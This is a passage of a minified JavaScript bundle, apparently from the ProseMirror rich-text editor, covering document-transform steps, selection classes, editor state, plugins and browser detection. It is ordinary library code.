s=r.index(i);if(r.node(i).canReplaceWith(s,s,n))return r.before(i+1);if(s>0)return null}if(r.parentOffset==r.parent.content.size)for(let i=r.depth-1;i>=0;i--){let s=r.indexAfter(i);if(r.node(i).canReplaceWith(s,s,n))return r.after(i+1);if(s<r.node(i).childCount)return null}return null}function NC(t,e,n){let r=t.resolve(e);if(!n.content.size)return e;let i=n.content;for(let s=0;s<n.openStart;s++)i=i.firstChild.content;for(let s=1;s<=(n.openStart==0&&n.size?2:1);s++)for(let o=r.depth;o>=0;o--){let a=o==r.depth?0:r.pos<=(r.start(o+1)+r.end(o+1))/2?-1:1,l=r.index(o)+(a>0?1:0),u=r.node(o),c=!1;if(s==1)c=u.canReplace(l,l,i);else{let d=u.contentMatchAt(l).findWrapping(i.firstChild.type);c=d&&u.canReplaceWith(l,l,d[0])}if(c)return a==0?r.pos:a<0?r.before(o+1):r.after(o+1)}return null}function Kc(t,e,n=e,r=L.empty){if(e==n&&!r.size)return null;let i=t.resolve(e),s=t.resolve(n);return AC(i,s,r)?new Ie(e,n,r):new m3(i,s,r).fit()}function AC(t,e,n){return!n.openStart&&!n.openEnd&&t.start()==e.start()&&t.parent.canReplace(t.index(),e.index(),n.content)}class m3{constructor(e,n,r){this.$from=e,this.$to=n,this.unplaced=r,this.frontier=[],this.placed=A.empty;for(let i=0;i<=e.depth;i++){let s=e.node(i);this.frontier.push({type:s.type,match:s.contentMatchAt(e.indexAfter(i))})}for(let i=e.depth;i>0;i--)this.placed=A.from(e.node(i).copy(this.placed))}get depth(){return this.frontier.length-1}fit(){for(;this.unplaced.size;){let u=this.findFittable();u?this.placeNodes(u):this.openMore()||this.dropNode()}let e=this.mustMoveInline(),n=this.placed.size-this.depth-this.$from.depth,r=this.$from,i=this.close(e<0?this.$to:r.doc.resolve(e));if(!i)return null;let s=this.placed,o=r.depth,a=i.depth;for(;o&&a&&s.childCount==1;)s=s.firstChild.content,o--,a--;let l=new L(s,o,a);return e>-1?new Fe(r.pos,e,this.$to.pos,this.$to.end(),l,n):l.size||r.pos!=this.$to.pos?new Ie(r.pos,i.pos,l):null}findFittable(){let e=this.unplaced.openStart;for(let n=this.unplaced.content,r=0,i=this.unplaced.openEnd;r<e;r++){let s=n.firstChild;if(n.childCount>1&&(i=0),s.type.spec.isolating&&i<=r){e=r;break}n=s.content}for(let n=1;n<=2;n++)for(let r=n==1?e:this.unplaced.openStart;r>=0;r--){let i,s=null;r?(s=rf(this.unplaced.content,r-1).firstChild,i=s.content):i=this.unplaced.content;let o=i.firstChild;for(let a=this.depth;a>=0;a--){let{type:l,match:u}=this.frontier[a],c,d=null;if(n==1&&(o?u.matchType(o.type)||(d=u.fillBefore(A.from(o),!1)):s&&l.compatibleContent(s.type)))return{sliceDepth:r,frontierDepth:a,parent:s,inject:d};if(n==2&&o&&(c=u.findWrapping(o.type)))return{sliceDepth:r,frontierDepth:a,parent:s,wrap:c};if(s&&u.matchType(s.type))break}}}openMore(){let{content:e,openStart:n,openEnd:r}=this.unplaced,i=rf(e,n);return!i.childCount||i.firstChild.isLeaf?!1:(this.unplaced=new L(e,n+1,Math.max(r,i.size+n>=e.size-r?n+1:0)),!0)}dropNode(){let{content:e,openStart:n,openEnd:r}=this.unplaced,i=rf(e,n);if(i.childCount<=1&&n>0){let s=e.size-n<=n+i.size;this.unplaced=new L(lo(e,n-1,1),n-1,s?n-1:r)}else this.unplaced=new L(lo(e,n,1),n,r)}placeNodes({sliceDepth:e,frontierDepth:n,parent:r,inject:i,wrap:s}){for(;this.depth>n;)this.closeFrontierNode();if(s)for(let y=0;y<s.length;y++)this.openFrontierNode(s[y]);let o=this.unplaced,a=r?r.content:o.content,l=o.openStart-e,u=0,c=[],{match:d,type:f}=this.frontier[n];if(i){for(let y=0;y<i.childCount;y++)c.push(i.child(y));d=d.matchFragment(i)}let h=a.size+e-(o.content.size-o.openEnd);for(;u<a.childCount;){let y=a.child(u),x=d.matchType(y.type);if(!x)break;u++,(u>1||l==0||y.content.size)&&(d=x,c.push(PC(y.mark(f.allowedMarks(y.marks)),u==1?l:0,u==a.childCount?h:-1)))}let p=u==a.childCount;p||(h=-1),this.placed=uo(this.placed,n,A.from(c)),this.frontier[n].match=d,p&&h<0&&r&&r.type==this.frontier[this.depth].type&&this.frontier.length>1&&this.closeFrontierNode();for(let y=0,x=a;y<h;y++){let g=x.lastChild;this.frontier.push({type:g.type,match:g.contentMatchAt(g.childCount)}),x=g.content}this.unplaced=p?e==0?L.empty:new L(lo(o.content,e-1,1),e-1,h<0?o.openEnd:e-1):new L(lo(o.content,e,u),o.openStart,o.openEnd)}mustMoveInline(){if(!this.$to.parent.isTextblock)return-1;let e=this.frontier[this.depth],n;if(!e.type.isTextblock||!sf(this.$to,this.$to.depth,e.type,e.match,!1)||this.$to.depth==this.depth&&(n=this.findCloseLevel(this.$to))&&n.depth==this.depth)return-1;let{depth:r}=this.$to,i=this.$to.after(r);for(;r>1&&i==this.$to.end(--r);)++i;return i}findCloseLevel(e){e:for(let n=Math.min(this.depth,e.depth);n>=0;n--){let{match:r,type:i}=this.frontier[n],s=n<e.depth&&e.end(n+1)==e.pos+(e.depth-(n+1)),o=sf(e,n,i,r,s);if(o){for(let a=n-1;a>=0;a--){let{match:l,type:u}=this.frontier[a],c=sf(e,a,u,l,!0);if(!c||c.childCount)continue e}return{depth:n,fit:o,move:s?e.doc.resolve(e.after(n+1)):e}}}}close(e){let n=this.findCloseLevel(e);if(!n)return null;for(;this.depth>n.depth;)this.closeFrontierNode();n.fit.childCount&&(this.placed=uo(this.placed,n.depth,n.fit)),e=n.move;for(let r=n.depth+1;r<=e.depth;r++){let i=e.node(r),s=i.type.contentMatch.fillBefore(i.content,!0,e.index(r));this.openFrontierNode(i.type,i.attrs,s)}return e}openFrontierNode(e,n=null,r){let i=this.frontier[this.depth];i.match=i.match.matchType(e),this.placed=uo(this.placed,this.depth,A.from(e.create(n,r))),this.frontier.push({type:e,match:e.contentMatch})}closeFrontierNode(){let n=this.frontier.pop().match.fillBefore(A.empty,!0);n.childCount&&(this.placed=uo(this.placed,this.frontier.length,n))}}function lo(t,e,n){return e==0?t.cutByIndex(n,t.childCount):t.replaceChild(0,t.firstChild.copy(lo(t.firstChild.content,e-1,n)))}function uo(t,e,n){return e==0?t.append(n):t.replaceChild(t.childCount-1,t.lastChild.copy(uo(t.lastChild.content,e-1,n)))}function rf(t,e){for(let n=0;n<e;n++)t=t.firstChild.content;return t}function PC(t,e,n){if(e<=0)return t;let r=t.content;return e>1&&(r=r.replaceChild(0,PC(r.firstChild,e-1,r.childCount==1?n-1:0))),e>0&&(r=t.type.contentMatch.fillBefore(r).append(r),n<=0&&(r=r.append(t.type.contentMatch.matchFragment(r).fillBefore(A.empty,!0)))),t.copy(r)}function sf(t,e,n,r,i){let s=t.node(e),o=i?t.indexAfter(e):t.index(e);if(o==s.childCount&&!n.compatibleContent(s.type))return null;let a=r.fillBefore(s.content,!0,o);return a&&!g3(n,s.content,o)?a:null}function g3(t,e,n){for(let r=n;r<e.childCount;r++)if(!t.allowsMarks(e.child(r).marks))return!0;return!1}function y3(t){return t.spec.defining||t.spec.definingForContent}function x3(t,e,n,r){if(!r.size)return t.deleteRange(e,n);let i=t.doc.resolve(e),s=t.doc.resolve(n);if(AC(i,s,r))return t.step(new Ie(e,n,r));let o=OC(i,t.doc.resolve(n));o[o.length-1]==0&&o.pop();let a=-(i.depth+1);o.unshift(a);for(let f=i.depth,h=i.pos-1;f>0;f--,h--){let p=i.node(f).type.spec;if(p.defining||p.definingAsContext||p.isolating)break;o.indexOf(f)>-1?a=f:i.before(f)==h&&o.splice(1,0,-f)}let l=o.indexOf(a),u=[],c=r.openStart;for(let f=r.content,h=0;;h++){let p=f.firstChild;if(u.push(p),h==r.openStart)break;f=p.content}for(let f=c-1;f>=0;f--){let h=u[f],p=y3(h.type);if(p&&!h.sameMarkup(i.node(Math.abs(a)-1)))c=f;else if(p||!h.type.isTextblock)break}for(let f=r.openStart;f>=0;f--){let h=(f+c+1)%(r.openStart+1),p=u[h];if(p)for(let y=0;y<o.length;y++){let x=o[(y+l)%o.length],g=!0;x<0&&(g=!1,x=-x);let v=i.node(x-1),w=i.index(x-1);if(v.canReplaceWith(w,w,p.type,p.marks))return t.replace(i.before(x),g?s.after(x):n,new L(RC(r.content,0,r.openStart,h),h,r.openEnd))}}let d=t.steps.length;for(let f=o.length-1;f>=0&&(t.replace(e,n,r),!(t.steps.length>d));f--){let h=o[f];h<0||(e=i.before(h),n=s.after(h))}}function RC(t,e,n,r,i){if(e<n){let s=t.firstChild;t=t.replaceChild(0,s.copy(RC(s.content,e+1,n,r,s)))}if(e>r){let s=i.contentMatchAt(0),o=s.fillBefore(t).append(t);t=o.append(s.matchFragment(o).fillBefore(A.empty,!0))}return t}function v3(t,e,n,r){if(!r.isInline&&e==n&&t.doc.resolve(e).parent.content.size){let i=p3(t.doc,e,r.type);i!=null&&(e=n=i)}t.replaceRange(e,n,new L(A.from(r),0,0))}function w3(t,e,n){let r=t.doc.resolve(e),i=t.doc.resolve(n),s=OC(r,i);for(let o=0;o<s.length;o++){let a=s[o],l=o==s.length-1;if(l&&a==0||r.node(a).type.contentMatch.validEnd)return t.delete(r.start(a),i.end(a));if(a>0&&(l||r.node(a-1).canReplace(r.index(a-1),i.indexAfter(a-1))))return t.delete(r.before(a),i.after(a))}for(let o=1;o<=r.depth&&o<=i.depth;o++)if(e-r.start(o)==r.depth-o&&n>r.end(o)&&i.end(o)-n!=i.depth-o&&r.start(o-1)==i.start(o-1)&&r.node(o-1).canReplace(r.index(o-1),i.index(o-1)))return t.delete(r.before(o),n);t.delete(e,n)}function OC(t,e){let n=[],r=Math.min(t.depth,e.depth);for(let i=r;i>=0;i--){let s=t.start(i);if(s<t.pos-(t.depth-i)||e.end(i)>e.pos+(e.depth-i)||t.node(i).type.spec.isolating||e.node(i).type.spec.isolating)break;(s==e.start(i)||i==t.depth&&i==e.depth&&t.parent.inlineContent&&e.parent.inlineContent&&i&&e.start(i-1)==s-1)&&n.push(i)}return n}class ds extends rt{constructor(e,n,r){super(),this.pos=e,this.attr=n,this.value=r}apply(e){let n=e.nodeAt(this.pos);if(!n)return Te.fail("No node at attribute step's position");let r=Object.create(null);for(let s in n.attrs)r[s]=n.attrs[s];r[this.attr]=this.value;let i=n.type.create(r,null,n.marks);return Te.fromReplace(e,this.pos,this.pos+1,new L(A.from(i),0,n.isLeaf?0:1))}getMap(){return Tt.empty}invert(e){return new ds(this.pos,this.attr,e.nodeAt(this.pos).attrs[this.attr])}map(e){let n=e.mapResult(this.pos,1);return n.deletedAfter?null:new ds(n.pos,this.attr,this.value)}toJSON(){return{stepType:"attr",pos:this.pos,attr:this.attr,value:this.value}}static fromJSON(e,n){if(typeof n.pos!="number"||typeof n.attr!="string")throw new RangeError("Invalid input for AttrStep.fromJSON");return new ds(n.pos,n.attr,n.value)}}rt.jsonID("attr",ds);class ha extends rt{constructor(e,n){super(),this.attr=e,this.value=n}apply(e){let n=Object.create(null);for(let i in e.attrs)n[i]=e.attrs[i];n[this.attr]=this.value;let r=e.type.create(n,e.content,e.marks);return Te.ok(r)}getMap(){return Tt.empty}invert(e){return new ha(this.attr,e.attrs[this.attr])}map(e){return this}toJSON(){return{stepType:"docAttr",attr:this.attr,value:this.value}}static fromJSON(e,n){if(typeof n.attr!="string")throw new RangeError("Invalid input for DocAttrStep.fromJSON");return new ha(n.attr,n.value)}}rt.jsonID("docAttr",ha);let Cs=class extends Error{};Cs=function t(e){let n=Error.call(this,e);return n.__proto__=t.prototype,n};Cs.prototype=Object.create(Error.prototype);Cs.prototype.constructor=Cs;Cs.prototype.name="TransformError";class DC{constructor(e){this.doc=e,this.steps=[],this.docs=[],this.mapping=new fa}get before(){return this.docs.length?this.docs[0]:this.doc}step(e){let n=this.maybeStep(e);if(n.failed)throw new Cs(n.failed);return this}maybeStep(e){let n=e.apply(this.doc);return n.failed||this.addStep(e,n.doc),n}get docChanged(){return this.steps.length>0}addStep(e,n){this.docs.push(this.doc),this.steps.push(e),this.mapping.appendMap(e.getMap()),this.doc=n}replace(e,n=e,r=L.empty){let i=Kc(this.doc,e,n,r);return i&&this.step(i),this}replaceWith(e,n,r){return this.replace(e,n,new L(A.from(r),0,0))}delete(e,n){return this.replace(e,n,L.empty)}insert(e,n){return this.replaceWith(e,e,n)}replaceRange(e,n,r){return x3(this,e,n,r),this}replaceRangeWith(e,n,r){return v3(this,e,n,r),this}deleteRange(e,n){return w3(this,e,n),this}lift(e,n){return i3(this,e,n),this}join(e,n=1){return h3(this,e,n),this}wrap(e,n){return a3(this,e,n),this}setBlockType(e,n=e,r,i=null){return l3(this,e,n,r,i),this}setNodeMarkup(e,n,r=null,i){return c3(this,e,n,r,i),this}setNodeAttribute(e,n,r){return this.step(new ds(e,n,r)),this}setDocAttribute(e,n){return this.step(new ha(e,n)),this}addNodeMark(e,n){return this.step(new pr(e,n)),this}removeNodeMark(e,n){let r=this.doc.nodeAt(e);if(!r)throw new RangeError("No node at position "+e);if(n instanceof ee)n.isInSet(r.marks)&&this.step(new ki(e,n));else{let i=r.marks,s,o=[];for(;s=n.isInSet(i);)o.push(new ki(e,s)),i=s.removeFromSet(i);for(let a=o.length-1;a>=0;a--)this.step(o[a])}return this}split(e,n=1,r){return d3(this,e,n,r),this}addMark(e,n,r){return t3(this,e,n,r),this}removeMark(e,n,r){return n3(this,e,n,r),this}clearIncompatible(e,n,r){return pg(this,e,n,r),this}}const of=Object.create(null);class W{constructor(e,n,r){this.$anchor=e,this.$head=n,this.ranges=r||[new S3(e.min(n),e.max(n))]}get anchor(){return this.$anchor.pos}get head(){return this.$head.pos}get from(){return this.$from.pos}get to(){return this.$to.pos}get $from(){return this.ranges[0].$from}get $to(){return this.ranges[0].$to}get empty(){let e=this.ranges;for(let n=0;n<e.length;n++)if(e[n].$from.pos!=e[n].$to.pos)return!1;return!0}content(){return this.$from.doc.slice(this.from,this.to,!0)}replace(e,n=L.empty){let r=n.content.lastChild,i=null;for(let a=0;a<n.openEnd;a++)i=r,r=r.lastChild;let s=e.steps.length,o=this.ranges;for(let a=0;a<o.length;a++){let{$from:l,$to:u}=o[a],c=e.mapping.slice(s);e.replaceRange(c.map(l.pos),c.map(u.pos),a?L.empty:n),a==0&&ov(e,s,(r?r.isInline:i&&i.isTextblock)?-1:1)}}replaceWith(e,n){let r=e.steps.length,i=this.ranges;for(let s=0;s<i.length;s++){let{$from:o,$to:a}=i[s],l=e.mapping.slice(r),u=l.map(o.pos),c=l.map(a.pos);s?e.deleteRange(u,c):(e.replaceRangeWith(u,c,n),ov(e,r,n.isInline?-1:1))}}static findFrom(e,n,r=!1){let i=e.parent.inlineContent?new $(e):Li(e.node(0),e.parent,e.pos,e.index(),n,r);if(i)return i;for(let s=e.depth-1;s>=0;s--){let o=n<0?Li(e.node(0),e.node(s),e.before(s+1),e.index(s),n,r):Li(e.node(0),e.node(s),e.after(s+1),e.index(s)+1,n,r);if(o)return o}return null}static near(e,n=1){return this.findFrom(e,n)||this.findFrom(e,-n)||new Wt(e.node(0))}static atStart(e){return Li(e,e,0,0,1)||new Wt(e)}static atEnd(e){return Li(e,e,e.content.size,e.childCount,-1)||new Wt(e)}static fromJSON(e,n){if(!n||!n.type)throw new RangeError("Invalid input for Selection.fromJSON");let r=of[n.type];if(!r)throw new RangeError(`No selection type ${n.type} defined`);return r.fromJSON(e,n)}static jsonID(e,n){if(e in of)throw new RangeError("Duplicate use of selection JSON ID "+e);return of[e]=n,n.prototype.jsonID=e,n}getBookmark(){return $.between(this.$anchor,this.$head).getBookmark()}}W.prototype.visible=!0;class S3{constructor(e,n){this.$from=e,this.$to=n}}let iv=!1;function sv(t){!iv&&!t.parent.inlineContent&&(iv=!0,console.warn("TextSelection endpoint not pointing into a node with inline content ("+t.parent.type.name+")"))}class $ extends W{constructor(e,n=e){sv(e),sv(n),super(e,n)}get $cursor(){return this.$anchor.pos==this.$head.pos?this.$head:null}map(e,n){let r=e.resolve(n.map(this.head));if(!r.parent.inlineContent)return W.near(r);let i=e.resolve(n.map(this.anchor));return new $(i.parent.inlineContent?i:r,r)}replace(e,n=L.empty){if(super.replace(e,n),n==L.empty){let r=this.$from.marksAcross(this.$to);r&&e.ensureMarks(r)}}eq(e){return e instanceof $&&e.anchor==this.anchor&&e.head==this.head}getBookmark(){return new qc(this.anchor,this.head)}toJSON(){return{type:"text",anchor:this.anchor,head:this.head}}static fromJSON(e,n){if(typeof n.anchor!="number"||typeof n.head!="number")throw new RangeError("Invalid input for TextSelection.fromJSON");return new $(e.resolve(n.anchor),e.resolve(n.head))}static create(e,n,r=n){let i=e.resolve(n);return new this(i,r==n?i:e.resolve(r))}static between(e,n,r){let i=e.pos-n.pos;if((!r||i)&&(r=i>=0?1:-1),!n.parent.inlineContent){let s=W.findFrom(n,r,!0)||W.findFrom(n,-r,!0);if(s)n=s.$head;else return W.near(n,r)}return e.parent.inlineContent||(i==0?e=n:(e=(W.findFrom(e,-r,!0)||W.findFrom(e,r,!0)).$anchor,e.pos<n.pos!=i<0&&(e=n))),new $(e,n)}}W.jsonID("text",$);class qc{constructor(e,n){this.anchor=e,this.head=n}map(e){return new qc(e.map(this.anchor),e.map(this.head))}resolve(e){return $.between(e.resolve(this.anchor),e.resolve(this.head))}}class V extends W{constructor(e){let n=e.nodeAfter,r=e.node(0).resolve(e.pos+n.nodeSize);super(e,r),this.node=n}map(e,n){let{deleted:r,pos:i}=n.mapResult(this.anchor),s=e.resolve(i);return r?W.near(s):new V(s)}content(){return new L(A.from(this.node),0,0)}eq(e){return e instanceof V&&e.anchor==this.anchor}toJSON(){return{type:"node",anchor:this.anchor}}getBookmark(){return new gg(this.anchor)}static fromJSON(e,n){if(typeof n.anchor!="number")throw new RangeError("Invalid input for NodeSelection.fromJSON");return new V(e.resolve(n.anchor))}static create(e,n){return new V(e.resolve(n))}static isSelectable(e){return!e.isText&&e.type.spec.selectable!==!1}}V.prototype.visible=!1;W.jsonID("node",V);class gg{constructor(e){this.anchor=e}map(e){let{deleted:n,pos:r}=e.mapResult(this.anchor);return n?new qc(r,r):new gg(r)}resolve(e){let n=e.resolve(this.anchor),r=n.nodeAfter;return r&&V.isSelectable(r)?new V(n):W.near(n)}}class Wt extends W{constructor(e){super(e.resolve(0),e.resolve(e.content.size))}replace(e,n=L.empty){if(n==L.empty){e.delete(0,e.doc.content.size);let r=W.atStart(e.doc);r.eq(e.selection)||e.setSelection(r)}else super.replace(e,n)}toJSON(){return{type:"all"}}static fromJSON(e){return new Wt(e)}map(e){return new Wt(e)}eq(e){return e instanceof Wt}getBookmark(){return k3}}W.jsonID("all",Wt);const k3={map(){return this},resolve(t){return new Wt(t)}};function Li(t,e,n,r,i,s=!1){if(e.inlineContent)return $.create(t,n);for(let o=r-(i>0?0:1);i>0?o<e.childCount:o>=0;o+=i){let a=e.child(o);if(a.isAtom){if(!s&&V.isSelectable(a))return V.create(t,n-(i<0?a.nodeSize:0))}else{let l=Li(t,a,n+i,i<0?a.childCount:0,i,s);if(l)return l}n+=a.nodeSize*i}return null}function ov(t,e,n){let r=t.steps.length-1;if(r<e)return;let i=t.steps[r];if(!(i instanceof Ie||i instanceof Fe))return;let s=t.mapping.maps[r],o;s.forEach((a,l,u,c)=>{o==null&&(o=c)}),t.setSelection(W.near(t.doc.resolve(o),n))}const av=1,hl=2,lv=4;class b3 extends DC{constructor(e){super(e.doc),this.curSelectionFor=0,this.updated=0,this.meta=Object.create(null),this.time=Date.now(),this.curSelection=e.selection,this.storedMarks=e.storedMarks}get selection(){return this.curSelectionFor<this.steps.length&&(this.curSelection=this.curSelection.map(this.doc,this.mapping.slice(this.curSelectionFor)),this.curSelectionFor=this.steps.length),this.curSelection}setSelection(e){if(e.$from.doc!=this.doc)throw new RangeError("Selection passed to setSelection must point at the current document");return this.curSelection=e,this.curSelectionFor=this.steps.length,this.updated=(this.updated|av)&~hl,this.storedMarks=null,this}get selectionSet(){return(this.updated&av)>0}setStoredMarks(e){return this.storedMarks=e,this.updated|=hl,this}ensureMarks(e){return ee.sameSet(this.storedMarks||this.selection.$from.marks(),e)||this.setStoredMarks(e),this}addStoredMark(e){return this.ensureMarks(e.addToSet(this.storedMarks||this.selection.$head.marks()))}removeStoredMark(e){return this.ensureMarks(e.removeFromSet(this.storedMarks||this.selection.$head.marks()))}get storedMarksSet(){return(this.updated&hl)>0}addStep(e,n){super.addStep(e,n),this.updated=this.updated&~hl,this.storedMarks=null}setTime(e){return this.time=e,this}replaceSelection(e){return this.selection.replace(this,e),this}replaceSelectionWith(e,n=!0){let r=this.selection;return n&&(e=e.mark(this.storedMarks||(r.empty?r.$from.marks():r.$from.marksAcross(r.$to)||ee.none))),r.replaceWith(this,e),this}deleteSelection(){return this.selection.replace(this),this}insertText(e,n,r){let i=this.doc.type.schema;if(n==null)return e?this.replaceSelectionWith(i.text(e),!0):this.deleteSelection();{if(r==null&&(r=n),r=r??n,!e)return this.deleteRange(n,r);let s=this.storedMarks;if(!s){let o=this.doc.resolve(n);s=r==n?o.marks():o.marksAcross(this.doc.resolve(r))}return this.replaceRangeWith(n,r,i.text(e,s)),this.selection.empty||this.setSelection(W.near(this.selection.$to)),this}}setMeta(e,n){return this.meta[typeof e=="string"?e:e.key]=n,this}getMeta(e){return this.meta[typeof e=="string"?e:e.key]}get isGeneric(){for(let e in this.meta)return!1;return!0}scrollIntoView(){return this.updated|=lv,this}get scrolledIntoView(){return(this.updated&lv)>0}}function uv(t,e){return!e||!t?t:t.bind(e)}class co{constructor(e,n,r){this.name=e,this.init=uv(n.init,r),this.apply=uv(n.apply,r)}}const C3=[new co("doc",{init(t){return t.doc||t.schema.topNodeType.createAndFill()},apply(t){return t.doc}}),new co("selection",{init(t,e){return t.selection||W.atStart(e.doc)},apply(t){return t.selection}}),new co("storedMarks",{init(t){return t.storedMarks||null},apply(t,e,n,r){return r.selection.$cursor?t.storedMarks:null}}),new co("scrollToSelection",{init(){return 0},apply(t,e){return t.scrolledIntoView?e+1:e}})];class af{constructor(e,n){this.schema=e,this.plugins=[],this.pluginsByKey=Object.create(null),this.fields=C3.slice(),n&&n.forEach(r=>{if(this.pluginsByKey[r.key])throw new RangeError("Adding different instances of a keyed plugin ("+r.key+")");this.plugins.push(r),this.pluginsByKey[r.key]=r,r.spec.state&&this.fields.push(new co(r.key,r.spec.state,r))})}}class ts{constructor(e){this.config=e}get schema(){return this.config.schema}get plugins(){return this.config.plugins}apply(e){return this.applyTransaction(e).state}filterTransaction(e,n=-1){for(let r=0;r<this.config.plugins.length;r++)if(r!=n){let i=this.config.plugins[r];if(i.spec.filterTransaction&&!i.spec.filterTransaction.call(i,e,this))return!1}return!0}applyTransaction(e){if(!this.filterTransaction(e))return{state:this,transactions:[]};let n=[e],r=this.applyInner(e),i=null;for(;;){let s=!1;for(let o=0;o<this.config.plugins.length;o++){let a=this.config.plugins[o];if(a.spec.appendTransaction){let l=i?i[o].n:0,u=i?i[o].state:this,c=l<n.length&&a.spec.appendTransaction.call(a,l?n.slice(l):n,u,r);if(c&&r.filterTransaction(c,o)){if(c.setMeta("appendedTransaction",e),!i){i=[];for(let d=0;d<this.config.plugins.length;d++)i.push(d<o?{state:r,n:n.length}:{state:this,n:0})}n.push(c),r=r.applyInner(c),s=!0}i&&(i[o]={state:r,n:n.length})}}if(!s)return{state:r,transactions:n}}}applyInner(e){if(!e.before.eq(this.doc))throw new RangeError("Applying a mismatched transaction");let n=new ts(this.config),r=this.config.fields;for(let i=0;i<r.length;i++){let s=r[i];n[s.name]=s.apply(e,this[s.name],this,n)}return n}get tr(){return new b3(this)}static create(e){let n=new af(e.doc?e.doc.type.schema:e.schema,e.plugins),r=new ts(n);for(let i=0;i<n.fields.length;i++)r[n.fields[i].name]=n.fields[i].init(e,r);return r}reconfigure(e){let n=new af(this.schema,e.plugins),r=n.fields,i=new ts(n);for(let s=0;s<r.length;s++){let o=r[s].name;i[o]=this.hasOwnProperty(o)?this[o]:r[s].init(e,i)}return i}toJSON(e){let n={doc:this.doc.toJSON(),selection:this.selection.toJSON()};if(this.storedMarks&&(n.storedMarks=this.storedMarks.map(r=>r.toJSON())),e&&typeof e=="object")for(let r in e){if(r=="doc"||r=="selection")throw new RangeError("The JSON fields `doc` and `selection` are reserved");let i=e[r],s=i.spec.state;s&&s.toJSON&&(n[r]=s.toJSON.call(i,this[i.key]))}return n}static fromJSON(e,n,r){if(!n)throw new RangeError("Invalid input for EditorState.fromJSON");if(!e.schema)throw new RangeError("Required config field 'schema' missing");let i=new af(e.schema,e.plugins),s=new ts(i);return i.fields.forEach(o=>{if(o.name=="doc")s.doc=sn.fromJSON(e.schema,n.doc);else if(o.name=="selection")s.selection=W.fromJSON(s.doc,n.selection);else if(o.name=="storedMarks")n.storedMarks&&(s.storedMarks=n.storedMarks.map(e.schema.markFromJSON));else{if(r)for(let a in r){let l=r[a],u=l.spec.state;if(l.key==o.name&&u&&u.fromJSON&&Object.prototype.hasOwnProperty.call(n,a)){s[o.name]=u.fromJSON.call(l,e,n[a],s);return}}s[o.name]=o.init(e,s)}}),s}}function LC(t,e,n){for(let r in t){let i=t[r];i instanceof Function?i=i.bind(e):r=="handleDOMEvents"&&(i=LC(i,e,{})),n[r]=i}return n}class we{constructor(e){this.spec=e,this.props={},e.props&&LC(e.props,this,this.props),this.key=e.key?e.key.key:IC("plugin")}getState(e){return e[this.key]}}const lf=Object.create(null);function IC(t){return t in lf?t+"$"+ ++lf[t]:(lf[t]=0,t+"$")}class ze{constructor(e="key"){this.key=IC(e)}get(e){return e.config.pluginsByKey[this.key]}getState(e){return e[this.key]}}const Ue=function(t){for(var e=0;;e++)if(t=t.previousSibling,!t)return e},Es=function(t){let e=t.assignedSlot||t.parentNode;return e&&e.nodeType==11?e.host:e};let Zh=null;const Dn=function(t,e,n){let r=Zh||(Zh=document.createRange());return r.setEnd(t,n??t.nodeValue.length),r.setStart(t,e||0),r},E3=function(){Zh=null},bi=function(t,e,n,r){return n&&(cv(t,e,n,r,-1)||cv(t,e,n,r,1))},T3=/^(img|br|input|textarea|hr)$/i;function cv(t,e,n,r,i){for(var s;;){if(t==n&&e==r)return!0;if(e==(i<0?0:_t(t))){let o=t.parentNode;if(!o||o.nodeType!=1||Ba(t)||T3.test(t.nodeName)||t.contentEditable=="false")return!1;e=Ue(t)+(i<0?0:1),t=o}else if(t.nodeType==1){let o=t.childNodes[e+(i<0?-1:0)];if(o.nodeType==1&&o.contentEditable=="false")if(!((s=o.pmViewDesc)===null||s===void 0)&&s.ignoreForSelection)e+=i;else return!1;else t=o,e=i<0?_t(t):0}else return!1}}function _t(t){return t.nodeType==3?t.nodeValue.length:t.childNodes.length}function M3(t,e){for(;;){if(t.nodeType==3&&e)return t;if(t.nodeType==1&&e>0){if(t.contentEditable=="false")return null;t=t.childNodes[e-1],e=_t(t)}else if(t.parentNode&&!Ba(t))e=Ue(t),t=t.parentNode;else return null}}function N3(t,e){for(;;){if(t.nodeType==3&&e<t.nodeValue.length)return t;if(t.nodeType==1&&e<t.childNodes.length){if(t.contentEditable=="false")return null;t=t.childNodes[e],e=0}else if(t.parentNode&&!Ba(t))e=Ue(t)+1,t=t.parentNode;else return null}}function A3(t,e,n){for(let r=e==0,i=e==_t(t);r||i;){if(t==n)return!0;let s=Ue(t);if(t=t.parentNode,!t)return!1;r=r&&s==0,i=i&&s==_t(t)}}function Ba(t){let e;for(let n=t;n&&!(e=n.pmViewDesc);n=n.parentNode);return e&&e.node&&e.node.isBlock&&(e.dom==t||e.contentDOM==t)}const Gc=function(t){return t.focusNode&&bi(t.focusNode,t.focusOffset,t.anchorNode,t.anchorOffset)};function qr(t,e){let n=document.createEvent("Event");return n.initEvent("keydown",!0,!0),n.keyCode=t,n.key=n.code=e,n}function P3(t){let e=t.activeElement;for(;e&&e.shadowRoot;)e=e.shadowRoot.activeElement;return e}function R3(t,e,n){if(t.caretPositionFromPoint)try{let r=t.caretPositionFromPoint(e,n);if(r)return{node:r.offsetNode,offset:Math.min(_t(r.offsetNode),r.offset)}}catch{}if(t.caretRangeFromPoint){let r=t.caretRangeFromPoint(e,n);if(r)return{node:r.startContainer,offset:Math.min(_t(r.startContainer),r.startOffset)}}}const bn=typeof navigator<"u"?navigator:null,dv=typeof document<"u"?document:null,zr=bn&&bn.userAgent||"",ep=/Edge\/(\d+)/.exec(zr),jC=/MSIE \d/.exec(zr),tp=/Trident\/(?:[7-9]|\d{2,})\..*rv:(\d+)/.exec(zr),kt=!!(jC||tp||ep),Tr=jC?document.documentMode:tp?+tp[1]:ep?+ep[1]:0,an=!kt&&/gecko\/(\d+)/i.test(zr);an&&+(/Firefox\/(\d+)/.exec(zr)||[0,0])[1];const np=!kt&&/Chrome\/(\d+)/.exec(zr),tt=!!np,FC=np?+np[1]:0,lt=!kt&&!!bn&&/Apple Computer/.test(bn.vendor),Ts=lt&&(/Mobile\/\w+/.test(zr)||!!bn&&bn.maxTouchPoints>2),Ft=Ts||(bn?/Mac/.test(bn.platform):!1),O3=bn?/Win/.test(bn.platform):!1,Fn=/Android \d/.test(zr),Va=!!dv&&"webkitFontSmoothing"in dv.documentElement.style,D3=Va?+(/\bAppleWebKit\/(\d+)/.exec(navigator.userAgent)||[0,0])[1]:0;function L3(t){let e=t.defaultView&&t.defaultView.visualViewport;return e?{left:0,right:e.width,top:0,bottom:e.height}:{left:0,right:t.documentElement.clientWidth,top:0,bottom:t.documentElement.clientHeight}}function Nn(t,e){return typeof t=="number"?t:t[e]}function I3(t){let 